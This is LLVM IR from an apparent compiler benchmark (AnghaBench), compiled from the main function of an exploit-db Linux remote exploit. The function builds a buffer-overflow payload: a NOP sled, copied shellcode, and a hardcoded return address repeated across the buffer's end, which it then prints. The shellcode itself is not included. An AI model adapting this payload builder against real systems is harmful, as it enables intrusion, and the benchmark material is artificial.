; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22659.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22659.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@bufsize = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  store i64 0, i64* %1, align 8
  %5 = load i32, i32* @bufsize, align 4
  %6 = zext i32 %5 to i64
  %7 = call i8* @llvm.stacksave()
  store i8* %7, i8** %3, align 8
  %8 = alloca i8, i64 %6, align 16
  store i64 %6, i64* %4, align 8
  %9 = load i32, i32* @NOP, align 4
  %10 = load i32, i32* @bufsize, align 4
  %11 = call i32 @memset(i8* %8, i32 %9, i32 %10)
  %12 = load i32, i32* @bufsize, align 4
  %13 = sext i32 %12 to i64
  %14 = load i32*, i32** @shellcode, align 8
  %15 = call i32 @strlen(i32* %14)
  %16 = sext i32 %15 to i64
  %17 = add i64 %16, 84
  %18 = sub i64 %13, %17
  %19 = getelementptr inbounds i8, i8* %8, i64 %18
  %20 = load i32*, i32** @shellcode, align 8
  %21 = load i32*, i32** @shellcode, align 8
  %22 = call i32 @strlen(i32* %21)
  %23 = call i32 @memcpy(i8* %19, i32* %20, i32 %22)
  store i32 -1073750388, i32* %2, align 4
  %24 = load i32, i32* @bufsize, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = getelementptr inbounds i8, i8* %8, i64 %26
  %28 = call i32 @memcpy(i8* %27, i32* %2, i32 4)
  %29 = load i32, i32* @bufsize, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 %30, 8
  %32 = getelementptr inbounds i8, i8* %8, i64 %31
  %33 = call i32 @memcpy(i8* %32, i32* %2, i32 4)
  %34 = load i32, i32* @bufsize, align 4
  %35 = sext i32 %34 to i64
  %36 = sub i64 %35, 12
  %37 = getelementptr inbounds i8, i8* %8, i64 %36
  %38 = call i32 @memcpy(i8* %37, i32* %2, i32 4)
  %39 = load i32, i32* @bufsize, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 %40, 16
  %42 = getelementptr inbounds i8, i8* %8, i64 %41
  %43 = call i32 @memcpy(i8* %42, i32* %2, i32 4)
  %44 = load i32, i32* @bufsize, align 4
  %45 = sext i32 %44 to i64
  %46 = sub i64 %45, 20
  %47 = getelementptr inbounds i8, i8* %8, i64 %46
  %48 = call i32 @memcpy(i8* %47, i32* %2, i32 4)
  %49 = load i32, i32* @bufsize, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 24
  %52 = getelementptr inbounds i8, i8* %8, i64 %51
  %53 = call i32 @memcpy(i8* %52, i32* %2, i32 4)
  %54 = load i32, i32* @bufsize, align 4
  %55 = sext i32 %54 to i64
  %56 = sub i64 %55, 28
  %57 = getelementptr inbounds i8, i8* %8, i64 %56
  %58 = call i32 @memcpy(i8* %57, i32* %2, i32 4)
  %59 = load i32, i32* @bufsize, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 %60, 32
  %62 = getelementptr inbounds i8, i8* %8, i64 %61
  %63 = call i32 @memcpy(i8* %62, i32* %2, i32 4)
  %64 = load i32, i32* @bufsize, align 4
  %65 = sext i32 %64 to i64
  %66 = sub i64 %65, 36
  %67 = getelementptr inbounds i8, i8* %8, i64 %66
  %68 = call i32 @memcpy(i8* %67, i32* %2, i32 4)
  %69 = load i32, i32* @bufsize, align 4
  %70 = sext i32 %69 to i64
  %71 = sub i64 %70, 40
  %72 = getelementptr inbounds i8, i8* %8, i64 %71
  %73 = call i32 @memcpy(i8* %72, i32* %2, i32 4)
  %74 = load i32, i32* @bufsize, align 4
  %75 = sext i32 %74 to i64
  %76 = sub i64 %75, 44
  %77 = getelementptr inbounds i8, i8* %8, i64 %76
  %78 = call i32 @memcpy(i8* %77, i32* %2, i32 4)
  %79 = load i32, i32* @bufsize, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 %80, 48
  %82 = getelementptr inbounds i8, i8* %8, i64 %81
  %83 = call i32 @memcpy(i8* %82, i32* %2, i32 4)
  %84 = load i32, i32* @bufsize, align 4
  %85 = sext i32 %84 to i64
  %86 = sub i64 %85, 52
  %87 = getelementptr inbounds i8, i8* %8, i64 %86
  %88 = call i32 @memcpy(i8* %87, i32* %2, i32 4)
  %89 = load i32, i32* @bufsize, align 4
  %90 = sext i32 %89 to i64
  %91 = sub i64 %90, 56
  %92 = getelementptr inbounds i8, i8* %8, i64 %91
  %93 = call i32 @memcpy(i8* %92, i32* %2, i32 4)
  %94 = load i32, i32* @bufsize, align 4
  %95 = sext i32 %94 to i64
  %96 = sub i64 %95, 60
  %97 = getelementptr inbounds i8, i8* %8, i64 %96
  %98 = call i32 @memcpy(i8* %97, i32* %2, i32 4)
  %99 = load i32, i32* @bufsize, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 %100, 64
  %102 = getelementptr inbounds i8, i8* %8, i64 %101
  %103 = call i32 @memcpy(i8* %102, i32* %2, i32 4)
  %104 = load i32, i32* @bufsize, align 4
  %105 = sext i32 %104 to i64
  %106 = sub i64 %105, 68
  %107 = getelementptr inbounds i8, i8* %8, i64 %106
  %108 = call i32 @memcpy(i8* %107, i32* %2, i32 4)
  %109 = load i32, i32* @bufsize, align 4
  %110 = sext i32 %109 to i64
  %111 = sub i64 %110, 72
  %112 = getelementptr inbounds i8, i8* %8, i64 %111
  %113 = call i32 @memcpy(i8* %112, i32* %2, i32 4)
  %114 = load i32, i32* @bufsize, align 4
  %115 = sext i32 %114 to i64
  %116 = sub i64 %115, 76
  %117 = getelementptr inbounds i8, i8* %8, i64 %116
  %118 = call i32 @memcpy(i8* %117, i32* %2, i32 4)
  %119 = load i32, i32* @bufsize, align 4
  %120 = sext i32 %119 to i64
  %121 = sub i64 %120, 80
  %122 = getelementptr inbounds i8, i8* %8, i64 %121
  %123 = call i32 @memcpy(i8* %122, i32* %2, i32 4)
  %124 = load i32, i32* @bufsize, align 4
  %125 = sext i32 %124 to i64
  %126 = sub i64 %125, 84
  %127 = getelementptr inbounds i8, i8* %8, i64 %126
  %128 = call i32 @memcpy(i8* %127, i32* %2, i32 4)
  %129 = call i32 @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8* %8)
  %130 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %130)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32*, i32) #2

declare dso_local i32 @strlen(i32*) #2

declare dso_local i32 @printf(i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
